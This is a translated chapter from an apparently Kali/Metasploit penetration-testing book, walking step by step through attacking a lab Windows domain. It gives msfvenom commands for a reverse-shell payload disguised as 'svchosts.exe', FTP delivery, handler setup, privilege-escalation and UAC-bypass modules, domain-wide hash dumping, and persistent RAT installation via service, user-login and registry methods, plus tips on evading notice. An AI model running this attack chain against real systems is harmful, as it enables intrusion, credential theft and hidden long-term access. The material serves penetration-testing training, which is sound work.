# 第八章：Windows 权限提升和保持访问

在本章中，您将学习一旦利用了系统，如何将您的权限提升到系统级别访问。您还将学习即使攻击失败时如何从系统中获取信息。没有完全的失败；即使事情出错时，总是有东西可以学习。您将学习如何向您的攻击添加持久性，以保持对受害者机器的未来访问。

在本章中，您将学习以下主题：

+   Windows 权限提升

+   MS16-032 次要登录句柄权限提升

+   Windows 提升服务权限本地权限提升

+   保持访问

# 技术要求

在本章中，您将需要一个目标 Windows 机器和一个正在运行的 Kali 实例。

# Windows 权限提升

特权提升是获得比所使用的帐户被赋予的更高级别访问权限。在黑客术语中，这被称为**rooting the box**。这来自 UNIX/Linux 世界，其中 root 是管理员帐户。有了这个访问级别，你就拥有了这个系统。在 Windows 系统中，管理员帐户具有管理员级别的访问权限，并且可以对系统进行几乎任何操作。但是，在 Windows 中，还有更高级别的访问权限，称为系统。有了这个帐户，您可以完全控制系统的所有级别。这就是我们想要的访问级别。

获得用户帐户的访问权限比攻击中获得域管理员帐户要容易得多。用户帐户比管理员帐户更多，因此仅仅通过数量来捕获其中一个（有线或无线）更容易。用户帐户通常被锁定，因此您无法获得对机器系统级别的任何真正访问权限。在这里，我们将绕过这一点。一旦获得对机器的实际访问权限，提升您的权限就很容易，我们将看到。

在本章中，我们有一个由防火墙保护的网络，其中有两台服务器和两台工作站。网络还有一个无线接入点。作为攻击者，我们通过无线设备侵入了网络，并使用 SMB 中毒攻击从网络中获取了用户帐户哈希。使用这些窃取的凭据，我们将访问网络上的工作站，并逐步提升网络阶梯，以获得对域控制器的访问权限。

# 提升您的权限

我们使用 Responder 工具运行了 SMB 中毒攻击，并捕获了两个帐户。一个是用户帐户`fflintstone`，我们很幸运地还捕获了`Administrator`帐户的一个 NTLMv2 哈希。正如我们在下面的屏幕截图中所看到的，通过运行攻击以将 HTTP-NTLM 支持降级为基本支持，我们捕获了`fflintstone`的明文密码，因此我们有一个加密密码可供使用。NTLMv2 哈希与 V1 哈希不同，V2 哈希使用服务器到客户端通信中给出的挑战和响应进行加盐。因此，我们不能仅仅使用哈希来代替实际密码进行登录，但如果只捕获到哈希，我们可以使用密码破解工具（如 John、Hashcat 或 Hydra）轻松破解这个哈希并获得实际密码。由于我们很幸运地获得了明文密码，我们将使用这个密码。

![](img/65f8d640-7129-4eed-995a-ea88f1ec3db6.png)

一旦我们获得了受害者的机器访问权限，我们将需要一个有效负载来连接到攻击机器。因此，让我们使用 MSFvenom 工具构建一个快速有效负载，以上传到我们的受害者。

# MSFvenom

MSFvenom 是一个利用打包工具，配备了 Metasploit 框架。MSFvenom 能够构建从简单利用到包含代码以混淆用于绕过反病毒服务的利用的复杂利用。在这里，我们将构建一个简单的利用来运行。通常，我会首先构建和运行简单的利用，如果反病毒出现问题，我会尝试构建一个绕过反病毒的利用。

MSFvenom 是一个非常强大的工具，我们可以从以下`help`文件中看到：

```
    MsfVenom - a Metasploit standalone payload generator.
    Also a replacement for msfpayload and msfencode.
    Usage: /usr/bin/msfvenom [options] <var=val>
    Options:
    -p, --payload  <payload> Payload to use. Specify a '-' or stdin to use custom payloads
    --payload-options   List the payload's standard options
    -l, --list   [type]  List a module type. Options are: payloads, encoders, nops, all
    -n, --nopsled  <length>  Prepend a nopsled of [length] size on to the payload
    -f, --format  <format>  Output format (use --help-formats for a list)
    --help-formats    List available formats
    -e, --encoder  <encoder> The encoder to use
    -a, --arch   <arch>  The architecture to use
    --platform  <platform> The platform of the payload
    --help-platforms    List available platforms
    -s, --space   <length>  The maximum size of the resulting payload
    --encoder-space <length>  The maximum size of the encoded payload (defaults to the -s value)
    -b, --bad-chars  <list>  The list of characters to avoid example: '\x00\xff'
    -i, --iterations <count>  The number of times to encode the payload
    -c, --add-code  <path>  Specify an additional win32 shellcode file to include
    -x, --template  <path>  Specify a custom executable file to use as a template
    -k, --keep      Preserve the template behavior and inject the payload as a new thread
    -o, --out   <path>  Save the payload
    -v, --var-name  <name>  Specify a custom variable name to use for certain output formats
    --smallest     Generate the smallest possible payload
    -h, --help      Show this message

```

通过运行`msfvenom --help-formats`命令，我们可以得到有效负载可以编译为的格式列表。

可执行格式如下：

`asp`，`aspx`，`aspx-exe`，`axis2`，`dll`，`elf`，`elf-so`，`exe`，`exe-only`，`exe-service`，`exe-small`，`hta-psh`，`jar`，`jsp`，`loop-vbs`，`macho`，`msi`，`msi-nouac`，`osx-app`，`psh`，`psh-cmd`，`psh-net`，`psh-reflection`，`vba`，`vba-exe`，`vba-psh`，`vbs`和`war`。

转换格式如下：

`bash`，`c`，`csharp`，`dw`，`dword`，`hex`，`java`，`js_be`，`js_le`，`num`，`perl`，`pl`，`powershell`，`ps1`，`py`，`python`，`raw`，`rb`，`ruby`，`sh`，`vbapplication`和`vbscript`。

![](img/5c558df9-d1e2-4a6c-b06c-6a9cb55f85d1.png)

现在我们有了我们的有效负载，我们需要将其上传，以便我们可以从受害者的机器上下载它。所有 Windows 系统都配备了内置的 FTP 客户端，可以通过命令行界面或使用 PowerShell 来运行。PowerShell 脚本也可以用于使用 FTP 或 HTTP 服务获取文件。就我个人而言，我喜欢简单的 FTP 客户端。Metasploit 专门为此目的内置了 FTP 服务器。要从 MSFconsole 启动此服务，请从命令行运行以下命令：

+   `msfdb start`：这将启动 Metasploit 数据库

+   `mfsconsole`：这将启动控制台

+   `workspace <NameOfWorkspace>`：这将使您进入现有的工作区

+   `use auxiliary/server/ftp`：这将使您进入 FTP 服务器配置

通过运行`show options`命令，我们可以看到服务的选项如下：

![](img/67a9cd4a-b831-4365-b2be-edac425e7417.png)

我们看到`FTPROOT`选项设置为`/tmp/ftproot`目录。对于一次性使用，您需要运行`mkdir /tmp/ftproot`命令，这将设置服务的目录并允许您将您的利用程序复制到此目录。这对一次性使用很好，但当系统关闭时，`/tmp`目录会被清空，因此目录和文件会被删除。有时，这是您想要的结果。我喜欢保留我的文件以备后用，因此我通过运行`mkdir /var/ftproot`命令来设置以下目录。此目录将永久保留，任何文件或利用程序在关闭后仍将保留。我们将保留`FTPUSER`和`FTPPASS`字段为空，并使用匿名连接来获取文件，因为我们只会让此服务运行一段时间。如果您需要让服务运行一段时间，或者您在一个敌对网络上，可能明智地设置这两个选项。我们需要设置以下选项。

我们攻击机的地址是`172.16.42.215`，如下所示：

```
set SRVHOST 172.16.42.215
set FTPROOT /var/ftproot
```

我们需要将我们构建的利用程序复制到`ftproot`目录中，如下所示：

```
    cp srvhosts.exe /var/ftproot/srvhosts.exe
```

然后我们需要使用`run`命令：

![](img/0f68015f-ff6a-4632-be02-8872918b47fa.png)

这将启动 FTP 服务。通过运行`jobs`命令，我们可以看到正在运行的服务。

我们现在在 FTP 服务上设置了有效负载的有效登录，所以我们准备好发动攻击。在我们对系统的扫描中，我们看到 RDP 服务在端口`3389`上运行，因此我们将使用**rdesktop**应用程序连接到系统，如下所示：

```
rdesktop 172.16.42.6  
```

![](img/2fc0e76f-edf0-44a2-9667-81aad699781b.png)

单击“其他用户”按钮以进入默认登录屏幕，并输入捕获的域凭据：

![](img/91808fb5-d0c1-4299-bd5b-3774c594b331.png)

一旦我们进入，要么打开命令行界面，要么打开 PowerShell 窗口，并按照以下方式下载文件。攻击机器的 IP 地址是`172.16.42.215`：

```
ftp 172.16.42.215 
```

它会要求一个用户名；输入`anonymous`并按下*Enter*键。然后，服务将要求密码。同样，只需按下*Enter*键，留空即可。

这将在这个设置上正常工作。运行`dir`命令，我们可以看到我们的利用程序；我们将通过运行以下命令将其下载到 Windows 的`temp`目录中：

```
GET svchosts.exe C:\Windows\temp\svchosts.exe  
```

![](img/9c5d97a8-e4e5-4855-abfd-ab5a1b6765ba.png)

MSFconsole 还将报告文件下载如下：

![](img/74ff9117-3e5d-4517-9c3e-4120af57dff7.png)

在运行利用程序之前，我们需要在攻击机器上设置利用处理程序。我们将为利用程序设置 Metasploit 多/处理程序，以便利用程序连接。处理程序的默认有效载荷是`reverse_tcp`有效载荷，并在端口`4444`上运行。

当我们构建我们的利用程序时，我们设置它使用`reverse_https`来隐藏我们的流量作为 HTTPS 流量，因此我们必须更改默认设置。从 MSFconsole 中运行以下命令：

```
use exploit/multi/handler
set LHOST 172.16.42.215 //(the attacking machine)
set LPORT 443
set PAYLOAD windows/meterpreter/reverse_https (sets the handler payload)
show options //(this will let you check the settings)
run -j //(the -j option will run the handler as a job in the background)  
```

![](img/b70ea545-eef3-4bcd-ab4d-08565de7e39b.png)

运行`jobs`命令，我们可以看到处理程序现在正在运行，还有 FTP 服务也在运行。我们现在可以通过运行以下命令来终止 FTP 服务：

```
jobs -k 1  
```

![](img/a3ca6fec-55c4-49a8-b859-82054e93a8e2.png)

现在我们已经准备好在受害者的机器上运行我们的利用程序。从命令行窗口或 PowerShell 运行以下命令：

```
C:\Windows\temp\svchosts.exe
```

这将启动利用程序并连接到攻击者机器上的处理程序。

![](img/51077842-bbc8-4ae1-805b-8bed4f45a92c.png)

在攻击者的系统中，在 Metasploit 中，我们可以看到利用程序连接到处理程序。然后，通过运行`sessions -l`命令，我们可以看到正在运行的会话。接下来，通过运行`sessions -i 2`命令，我们可以在机器上启动一个 Meterpreter shell。然后，通过运行`sysinfo`命令，我们可以看到我们连接到 BO-SRV2：

![](img/1cd7a229-23ba-4192-b268-11701904142e.png)

从我们会话的信息中，我们可以看到我们以`LAB1\rred`的身份连接。根据早期的足迹，我们知道这是一个没有管理员权限的域用户帐户，因此我们需要提升帐户权限以获取我们的好处。让我们运行`getsystem`命令。该命令使用 15 种内置方法来获取系统管理员权限。

以下截图显示未能获取系统访问权限。哎呀！看一下以下输出：

![](img/6724cab0-64ac-4855-b1d3-e6b8f5be53e2.png)

我们可以通过运行`getuid`命令来检查此失败，然后它会通过显示我们仍然以`LAB1\rred`的身份连接来做出响应。

在渗透测试中，持久性意味着不仅仅是持续运行利用程序。有时，它涉及使用许多后期利用程序对系统进行攻击，以提升权限。有些利用程序在某些系统上有效，而在其他时候则无效。持久性是关键。在利用这个系统时，作者不得不经历许多`post/windows`和`exploit/windows/local`模块，最终提升了他的用户权限。所示的`post`工具和利用程序在此次攻击中失败了，但在另一个系统上可能会成功。一旦你有了 Meterpreter shell，你会想要退出 shell，但仍然保持连接，方法是输入`background`并按下*Enter*键。

您可以通过运行以下命令找到`post/windows`和`exploit/windows/local`。结果将显示模块的日期。您将要使用比目标系统的年龄更老的模块。在运行 Server 2008 的系统上运行 Windows 2000 的利用程序没有多大用处。该利用程序将已经通过版本更新进行了修补。

+   `search post/windows`：这将找到后期模块

+   `search exploit/windows/local`：这将找到可以在活动会话上运行的利用程序

# MS16-032 次要登录句柄权限提升

接下来，我们将运行 MS16-032 次要登录句柄权限提升模块。模块的信息如下：

```
    msf > info exploit/windows/local/ms16_032_secondary_logon_handle_privesc
    Name: MS16-032 Secondary Logon Handle Privilege Escalation
    Module: exploit/windows/local/ms16_032_secondary_logon_handle_privesc
    Platform: Windows
    Privileged: No
    License: BSD License
    Rank: Normal
    Disclosed: 2016-03-21

    Provided by:
    James Forshaw
    b33f
    khr0x40sh

    Available targets:
    Id Name
    -- ----
    0 Windows x86
    1 Windows x64

    Basic options:
    Name  Current Setting Required Description
    ----  --------------- -------- -----------
    SESSION     yes  The session to run this module on.

    Payload information:

    Description:
    This module exploits the lack of sanitization of standard handles in 
    Windows' Secondary Logon Service. The vulnerability is known to 
    affect versions of Windows 7-10 and 2k8-2k12 32 and 64 bit. This 
    module will only work against those versions of Windows with 
    Powershell 2.0 or later and systems with two or more CPU cores.

```

有关 MS（MS16-032）的更多信息，请参阅以下参考资料：

+   [`cvedetails.com/cve/CVE-2016-0099/`](https://cvedetails.com/cve/CVE-2016-0099/)

+   [`twitter.com/FuzzySec/status/723254004042612736`](https://twitter.com/FuzzySec/status/723254004042612736)

+   [`googleprojectzero.blogspot.co.uk/2016/03/exploiting-leaked-thread-handle.html`](https://googleprojectzero.blogspot.co.uk/2016/03/exploiting-leaked-thread-handle.html)

此漏洞的作用是使用任意令牌创建新进程。这会欺骗服务使用特权访问令牌，从而绕过安全限制。

要使用此模块，请运行以下命令：

```
use exploit/windows/local/ms16_032_secondary_logon_handle_privesc  
```

![](img/29702ab4-d1de-4508-b362-c000b3730ea8.png)

通过运行`show options`命令，我们可以看到只有必须设置的`SESSION`选项。通过运行`sessions -l`命令，我们看到我们的运行会话是`2`。要设置此选项，请运行以下命令：

```
set SESSION 2  
```

然后运行以触发漏洞。我们看到漏洞失败了。漏洞运行了，但未能完全执行。阅读有关此漏洞的信息，我们发现您必须拥有两个或更多核心才能使此漏洞起作用。从系统足迹收集的其他信息中，我们可以假设这个系统是在单核心上运行的虚拟机。失败仍然可以提供有关目标的更多信息。

# Windows 提升服务权限本地权限提升

我们将运行的下一个模块是 Windows 提升服务权限本地权限提升模块，日期为 2012 年。这是一个本地漏洞，通过运行会话运行。同样，我们将使用会话 2。

要使用此模块，请运行以下命令：

```
use exploit/windows/local/service_permissions  
```

模块的描述如下：

```
    msf > info exploit/windows/local/service_permissions

    Name: Windows Escalate Service Permissions Local Privilege Escalation
    Module: exploit/windows/local/service_permissions
    Platform: Windows
    Privileged: No
    License: Metasploit Framework License (BSD)
    Rank: Great
    Disclosed: 2012-10-15

    Provided by:
    scriptjunkie

    Available targets:
    Id Name
    -- ----
    0 Automatic

    Basic options:
    Name  Current Setting Required Description
    ----  --------------- -------- -----------
    AGGRESSIVE false   no  Exploit as many services as possible (dangerous)
    SESSION      yes  The session to run this module on.

    Payload information:

    Description:
    This module attempts to exploit existing administrative privileges 
    to obtain a SYSTEM session. If directly creating a service fails, 
    this module will inspect existing services to look for insecure file 
    or configuration permissions that may be hijacked. It will then 
    attempt to restart the replaced service to run the payload. This 
    will result in a new session when this succeeds.

```

正如我们在以下输出中所看到的，漏洞再次运行，但仍然没有成功。这可能是一个失败，但从输出中，我们现在知道没有任何使用弱配置运行的服务。从会话超时，我们现在知道任何尝试使用这种方法欺骗服务的方法都是失败的：

![](img/e8a1ad96-143f-47fd-88fb-ead2c34c83ea.png)

# Windows 提升 UAC 保护绕过（ScriptHost 漏洞）

此模块尝试绕过 Windows 上的 UAC，使用 VB 脚本语言，通过利用`cscript/wscript.exe`可执行文件：

```
    msf > info exploit/windows/local/bypassuac_vbs 

    Name: Windows Escalate UAC Protection Bypass (ScriptHost Vulnerability)
    Module: exploit/windows/local/bypassuac_vbs
    Platform: Windows
    Privileged: No
    License: Metasploit Framework License (BSD)
    Rank: Excellent
    Disclosed: 2015-08-22

    Provided by:
    Vozzie
    Ben Campbell <eat_meatballs@hotmail.co.uk>

    Available targets:
    Id Name
    -- ----
    0 Automatic

    Basic options:
    Name  Current Setting Required Description
    ----  --------------- -------- -----------
    SESSION     yes  The session to run this module on.

    Payload information:

    Description:
    This module will bypass Windows UAC by utilizing the missing 
    .manifest on the script host cscript/wscript.exe binaries.

```

运行模块后，我们可以在以下屏幕截图中看到，我们试图妥协的用户帐户需要具有管理员权限。嗯，又是一个失败，但我们再次得知，我们正在使用的帐户在域中没有太多权限。我们确实获得了另一个帐户的凭据；也许该帐户有更多权限：

![](img/a7ffeb76-5870-4a27-b3ce-3bdd91567466.png)

通过运行`creds`命令，我们得到了一系列捕获的凭据。请注意，有不可重放的哈希，这些对离线破解并不太有用，但我们确实有另一个帐户（`fflintstone`），它使用明文密码捕获。我们将尝试使用我们之前的漏洞来尝试这个：

![](img/0b873077-a577-4a8e-a4ed-250aae94d136.png)

现在，要使其运行，必须更改 multi/handler 的用户帐户，因此我们需要终止会话 2，然后以`fflintstone`的身份 RDP 登录，然后重新运行漏洞以获得该用户的权限。我们需要重新进入 multi/handler 模块。

+   `use exploit/multi/handler`：这会将您带回处理程序

+   `sessions -k 2`：这会终止运行的会话 2

+   `run -j`：这会重新启动 multi/handler 以接受新连接，并将其作为后台作业运行

![](img/e9187b0c-0a39-4744-8bab-76fa71c31647.png)

现在，使用`fflintstone`帐户登录 RDP 会话后，我们将再次从命令行或 PowerShell 运行有效负载。

```
C:\Windows\Temp\svchosts.exe  
```

![](img/7fdc87d0-45c1-4aa8-b2bf-f44ad013fd0e.png)

在下面的截图中，我们可以看到我们的 Kali 盒子上的处理程序已接受连接，并在会话 3 上设置了一个 Meterpreter 会话：

![](img/2f0ef787-59ec-40b2-9ed7-1e53f6a8393c.png)

所以，现在让我们回到绕过 UAC 利用程序，并在新会话中运行它。要做到这一点，运行以下命令：

+   `back`：这将退出处理程序而不终止它，或任何会话

+   `use exploit/windows/local/bypassuac_vbs`：这将使您重新进入模块

+   `set session 3`：这将使利用程序使用会话 3

+   `exploit`：这将启动它

在下面的截图中，我们可以看到我们仍然失败了。看来 UAC 设置有更高的安全设置，无法被利用。再次，持久性是关键：

![](img/2d61ef9a-be1c-45ea-a9db-84105696ce8c.png)

看来 BO-SRV2 对我们目前拥有的帐户来说相当安全，所以让我们去攻击另一台机器。我们还没有尝试域控制器，所以让我们继续进行。我们以`LAB1\fflintstone`的身份使用 RDP 登录，并以与我们在 BO-SRV2 上相同的方式将我们的利用程序通过 FTP 传输到域控制器。在下面的截图中，我们切换到`C:\Windows\Temp`目录，然后连接回我们的 Kali 机器并下载利用程序，如下所示：

![](img/9241aead-3295-4274-a258-a9c23d45c3d2.png)

再次，我们准备运行利用程序并连接回我们的 Kali 盒子。确保您的多/处理程序设置并运行！现在，运行可执行文件。

`svchosts.exe`：这将启动利用程序，您将看到 Kali 上的会话打开。

![](img/d6900f6e-7ed2-497f-b918-c2725400060b.png)

我们回到我们的 VBS 绕过利用程序，并针对这个会话运行它。哦不！我们像在 BO-SRV2 上一样又失败了：

![](img/4307a3d4-fdf1-4d85-8f70-149ad195fee2.png)

现在，似乎所有服务器的安全性都针对所有用户帐户设置为高。我们需要摆脱这个讨厌的 UAC。这很可能也是我们的其他尝试失败的原因。当利用程序自动运行时，它们会被 UAC 阻止。我们需要禁用 UAC 并将其排除在外。由于我们有一个 RDP 会话和一些对机器有一些权限的帐户，我们将使用 GUI 来禁用 UAC，如下所示：

1.  前往控制面板。

1.  选择用户帐户。

1.  单击打开或关闭用户帐户控制。 

1.  点击通过 UAC 窗口。

1.  接下来，取消复选框。

1.  按下确定。

1.  然后会要求您重新启动计算机；继续。

1.  下面的截图显示了 UAC 窗口：

![](img/5ae59f16-97fc-4a0a-9ac8-676d4444fc87.png)

您可能会想为什么我们没有在 BO-SRV2 上这样做。足迹显示，BO-SRV2 是网络上的文件服务器。重新启动此系统可能会提醒用户我们的存在。网络可能只有一个文件服务器，因此如果重新启动它，就会被注意到，但域控制器是另一回事。我们可以重新启动此系统，没有人会知道，除非网络上有一个可以告诉我们的网络监控服务。至少，在重新启动域控制器时被抓住的机会较小。哦，是的；在重新启动机器之前，右键单击任务栏，转到任务管理器，并检查用户选项卡，确保您是唯一一个在盒子上的人。在管理员在盒子上时重新启动将意味着您被抓住了。我们可以在下面的截图中看到，我们现在是系统上唯一的一个人，所以安全地重新启动：

![](img/4db6dca3-7c50-415c-878f-a92fa617accd.png)

现在，重新启动后我们重新开始这个过程。确保您的 Kali 机器上的多/处理程序设置正确并运行。重新登录受害者的机器，并重新运行您的有效载荷：

```
C:\Windows\Temp\svchosts.exe  
```

然后您将看到 Meterpreter 会话在您的 Kali 盒子上启动，如下所示：

![](img/2716de20-95ce-49fa-bf72-3e9b8878f8fa.png)

好吧，让我们看看这次我们得到了什么！打开我们的 Meterpreter 会话，看看发生了什么。要打开会话，请执行以下操作：

+   `sessions -i 2`: `-i` 是与编号会话进行交互

+   `getuid`: 这显示我们正在以 `fflintstone` 身份运行

这只是为了好玩，因为上次运行它没有起作用。

+   `getsystem`: 中了！我们有赢家！当我们重新运行 `getuid` 时，我们看到我们现在是系统。是的，起身跳起您的快乐舞蹈：您现在拥有系统级别的特权！它完全被控制了：

![](img/47855e4d-9bf9-4358-a17e-969ec44e82cd.png)

因此，我们已经发现问题一直是 UAC，并且我们没有能力绕过通常出现在屏幕上的提示。即使具有管理员级别的访问权限，UAC 提示也会破坏我们完全攻陷机器的尝试。

因此，让我们掠夺系统并收集我们的战利品。作为域控制器，它掌握着王国的钥匙。在渗透测试中，一旦被掠夺，游戏就结束了。在真实世界的黑客攻击中，一旦实现了这一点，您的网络就完蛋了；除非完全重建整个网络结构，否则您永远无法确定您的攻击者完全被锁在外面。为此，我们将使用 `post` 模块来收集所有用户帐户及其哈希。为此，我们将使用 `post/windows/gather/smart_hashdump` 模块。

此模块的信息如下：

```
    msf post(smart_hashdump) > info

    Name: Windows Gather Local and Domain Controller Account Password Hashes
    Module: post/windows/gather/smart_hashdump
    Platform: Windows
    Arch: 
    Rank: Normal

    Provided by:
    Carlos Perez <carlos_perez@darkoperator.com>

    Basic options:
    Name  Current Setting Required Description
    ----  --------------- -------- -----------
    GETSYSTEM false   no  Attempt to get SYSTEM privilege on the target host.
    SESSION      yes  The session to run this module on.

    Description:
    This will dump local accounts from the SAM Database. If the target 
    host is a Domain Controller, it will dump the Domain Account 
    Database using the proper technique depending on privilege level, OS 
    and role of the host.

```

在设置和运行此模块之前，我们首先要退出 Meterpreter shell，而不中断连接，然后加载 post 模块并运行它。

从正在运行的 Metetpreter shell 中运行这些命令：

+   `background`: 这将使会话后台运行而不终止它。

+   `use post/windows/gather/smart_hashdump`: 这将加载 `smart_hashdump` 模块。

+   `show options`: 这将显示所需的选项。

+   `set SESSION 2`: 这将设置会话以使用我们正在运行的会话。

+   `show options`: 再次运行此命令以检查您的设置。

+   `利用`: 利用!!

![](img/0d84fc61-e734-49c4-ae15-d501d97ab5b5.png)

中了！您现在是 `LAB1.boweaver.net` 域的自豪所有者。请注意，域中的所有哈希，包括机器帐户，都已被掠夺。这些哈希不是经过盐处理的，不像使用 NTLMv2 在线捕获的哈希，后者是经过盐处理且不可重放的。这些是直接的 NTLM 哈希，可以用于**传递哈希**风格的攻击和登录到其他系统。它们也可以更容易地使用离线密码破解工具进行破解，以获取明文密码。

还要注意，凭证不仅已保存到 Metasploit 数据库中，还输出到了位于 `/root/.msf4/loot/20170709202230_lab1.boweaver.ne_172.16.42.5_windows.hashes_075027.txt` 的文件中。这个文本文件是以一种格式保存的，可以导入到 John 或 Hashcat 进行离线破解。

以下截图显示了本书的测试域的结果，因此输出并不那么大。在大型域中，这可能是一个非常大的转储：

![](img/06396ab8-5349-4250-8e14-f81383e4aba2.png)

黑客提示：

在转储大型域时，有时可以找到已禁用的帐户。最好启用其中一个帐户进行攻击使用，并提升此帐户的特权，而不是添加新的帐户进行攻击使用。

# 维持访问

一旦你获得了访问权限并提升了你的访问级别，你会想要回来。如果系统是通过对互联网开放端口的漏洞而被入侵的，那么返回就不是一个大问题，除非系统被修补。你可以随时重复利用你的漏洞，并重新获得对内部网络的访问权限。如果你使用钓鱼攻击或浏览器漏洞来攻击系统，那么你的连接只会发生一次，当链接被点击时，或者从被感染的网站运行浏览器漏洞时。以这些方式攻击用户的工作站，为了返回工作站并绕过防火墙，你需要一些东西来维持访问。对于配置良好的防火墙后面的系统来说，几乎不可能在没有任何对互联网开放的端口的情况下直接获得访问权限。然而，所有系统都可以呼叫互联网，所以这是我们的攻击向量和我们返回的方式。这就是为什么高度安全的网络应该始终是空气隔离的，没有物理方式呼叫公共网络。这就是小而毛茸茸、尾巴长、耳朵大的哺乳动物发挥作用的地方。

# 远程访问工具

**远程访问工具**（**RATs**）是一种可以用来呼叫服务器并维持与该服务器的连接的小型程序，有时被称为**命令和控制**服务器，或 CnC。使用来自服务器的连接，攻击者可以从内部机器访问受害者的内部网络，或者使用它作为一个 Pivot 来从攻击者的远程机器上攻击网络。

Pivots 是我个人最喜欢的。有了 Pivots，就不需要将工具上传到另一个受害者的机器上，这可能会触发反病毒软件和其他安全监控工作站在上传过程中。一旦 RAT 就位，你现在可以从第一个受害者的机器上进行 Pivot。此外，将像 Metasploit 这样的版本上传并安装到受害者的机器上是不切实际的。有了 Pivot，就不需要上传工具：你可以使用你系统上安装的工具来对内部受害者网络进行攻击，就像你插入内部网络一样。受害者的机器现在只是作为一个路由器，你的远程 Kali 机器现在位于内部网络上。Metasploit 内置了一些方便的 Pivots。还要记住，如果网络可以从无线接入点被入侵，那么你也可以完全访问内部网络，所以没有必要进行 Pivot。

如今有成千上万的 RAT 可用于任何系统，不仅仅是 Windows。Android RAT 如今也被广泛用于入侵手机和平板电脑，并维持对这些设备的访问。我们将使用 Metasploit 的 MSFvenom 工具来定制一些 RAT。我发现这些效果最好，其他工具，如 Mimikats，可以通过连接运行。

# Metasploit 的 persistence_exe 模块

我们首先要使用我们现有的会话，将一个持久的可执行文件加载到系统上，这将继续呼叫我们的多/handler。由于我们已经有了这个会话，并且它具有系统级别的访问权限，加载这个将会很容易。要加载模块，运行以下命令：

```
use post/windows/manage/persistence_exe
```

`persistence_exe`模块的信息如下：

```
    msf post(persistence_exe) > info

    Name: Windows Manage Persistent EXE Payload Installer
    Module: post/windows/manage/persistence_exe
    Platform: Windows
    Arch: 
    Rank: Normal

    Provided by:
    Merlyn drforbin Cousins <drforbin6@gmail.com>

    Basic options:
    Name  Current Setting Required Description
    ----  --------------- -------- -----------
    REXENAME default.exe  yes  The name to call exe on remote system
    REXEPATH     yes  The remote executable to use.
    SESSION     yes  The session to run this module on.
    STARTUP USER    yes  Startup type for the persistent payload. (Accepted: USER, SYSTEM, SERVICE)

    Description:
    This Module will upload a executable to a remote host and make it 
    Persistent. It can be installed as USER, SYSTEM, or SERVICE. USER 
    will start on user login, SYSTEM will start on system boot but 
    requires privs. SERVICE will create a new service that will start the payload. Again requires privs.

```

我们看到 RAT 的名称设置为`REXENAME`为`default.exe`。如果有人在审核进程列表，这将显得像一个恶意进程，所以让我们为它改个名字，更隐蔽一点。早些时候，我们构建了我们的有效载荷`svchosts.exe`。注意这个名字与已知运行的`svchost`可执行文件非常接近，这个文件在正常运行的服务器的运行进程中会出现很多次。名字接近实际服务名将使它更隐蔽一些。当我们有一个已知的有效利用时，为什么要构建一个新的有效载荷呢？

设置模块如下：

```
set REXENAME svchosts.exe
set REXEPATH /media/root/files/kali2016-2-book/chap8/svchosts.exe
set SESSION 2
set STARTUP SERVICE
show options
exploit
```

我们看到它已经上传了 RAT 并且未能打开系统管理器，回复说 RPC 服务器不可用：

![](img/ed6bdb62-75a9-4988-b91d-c8b5dd19ae0b.png)

在域控制器上，我们可以看到一个应用程序崩溃并且桌面上弹出了一个警告。在试图隐蔽时，这不是一件好事：

![](img/891006ee-ba1f-4bba-bb82-27ebdbf6255a.png)

错误显示应用程序 ApacheBench 已崩溃。此计算机未加载 Apache Web 服务器，因此错误可能来自我们正在使用的 HTTPS 有效负载。因此，让我们构建另一个有效负载，以用作 RAT，使用直接的 TCP 连接。要从命令行构建有效负载，请运行以下命令：

```
msfvenom -p windows/meterpreter_reverse_tcp --platform windows -f exe -a x86 LHOST=172.16.42.215 LPORT=4444 -o svchosts2.exe

```

![](img/b64246ba-c993-433b-9952-46cb6cad20ed.png)

我们需要为此有效负载设置一个多/处理程序：

```
use post/windows/manage/persistence_exe
set PAYLOAD windows/meterpreter_reverse_tcp
set LPORT 4444
run -j
```

现在使用以下命令返回到持久性模块：

```
use post/windows/manage/persistence_exe  
```

为新有效负载重置`REXEPATH`：

```
set REXEPATH /media/bo/files/kali2016-2-book/chap8/svchosts2.exe
show options # To check the settings then.
Exploit  
```

![](img/4bba8433-d724-4e24-93c6-9f43af76cb35.png)

正如我们所看到的，这次有效负载成功运行并打开了一个新的会话。我们还看到，RPC 服务器再次不可用，因此 RAT 没有作为服务加载。因此，RAT 很可能没有作为服务运行。作为服务运行是最理想的，但由于它给我们带来了问题，让我们将`STARTUP`设置为`USER`。使用此配置，我们必须等待用户再次登录才能运行漏洞利用。在使用此设置时，最好使用经常使用的帐户。检查事件日志将为您提供有关哪些用户登录以及登录频率的信息。

确保终止上次运行创建的会话，然后将`STARTUP`设置更改如下：

```
set STARTUP USER
show options
exploit  
```

![](img/32d1dc7c-4825-4f01-84a7-f40d8fe64ce9.png)

成功！在此运行中，模块加载了有效负载并将其设置为自动运行，所以我们应该可以继续进行。让我们测试结果。当我们运行此漏洞时，我们没有重新启动我们的多/处理程序来捕获有效负载，因为它之前已经运行过。我们可以看到没有会话被创建，即使其他一切都显示漏洞的成功运行。当我们设置并运行处理程序时，我们立即从有效负载获得连接：

![](img/97b782d7-de9d-4836-97f8-9eaae4bc8ac8.png)

让我们检查下次登录时是否重新连接。终止系统中的所有会话并注销 RDP 会话。接下来，重新启动多/处理程序以进行下次登录：

```
sessions -K # This kills all running sessions.
run -j # This restarts the handler.  
```

![](img/0510cba3-bafb-40db-856a-25dc8c5388f4.png)

当我们使用 RDP 会话重新登录时，我们看到一个新的会话已经在运行的处理程序上启动。我们能够与会话交互，并从 Meterpreter shell 获得系统访问权限：

![](img/dbf0a99b-45a3-4bde-89f9-df5488300aa5.png)

# 仅限 Windows 注册表的持久性

Windows 注册表是隐藏恶意代码的好地方。许多恶意软件和间谍软件使用这样的方法来隐藏和运行它们的有效负载。注册表的复杂性和注册表的系统访问级别使其成为一个很好的攻击向量。

我们将在当前运行的会话上运行以下模块，并尝试以系统级访问权限运行有效负载。模块的信息如下：

```
    msf exploit(registry_persistence) > info

    Name: Windows Registry Only Persistence
    Module: exploit/windows/local/registry_persistence
    Platform: Windows
    Privileged: No
    License: Metasploit Framework License (BSD)
    Rank: Excellent
    Disclosed: 2015-07-01

    Provided by:
    Donny Maasland <donny.maasland@fox-it.com>

    Available targets:
    Id Name
    -- ----
    0 Automatic

    Basic options:
    Name   Current Setting Required Description
    ----   --------------- -------- -----------
    BLOB_REG_KEY     no  The registry key to use for storing the payload blob. (Default: random)
    BLOB_REG_NAME     no  The name to use for storing the payload blob. (Default: random)
    CREATE_RC  true    no  Create a resource file for cleanup
